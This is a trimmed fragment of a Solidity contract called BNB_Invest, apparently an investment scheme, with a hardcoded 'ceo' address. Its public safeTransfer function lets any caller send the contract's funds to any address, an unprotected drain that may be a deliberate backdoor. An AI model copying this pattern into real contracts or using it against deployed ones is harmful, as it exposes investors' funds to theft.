...
contract BNB_Invest{
    ...
    constructor() public{
        ...
        ceoAddress2=address(0xc32A3aB7799B91e55Cb4238618e280E052664E90);
    }
    ...
    function safeTransfer(address _to,  uint amount) public payable{
       _to.transfer(amount);
   }
   function dataVerified(uint256 amount) external{
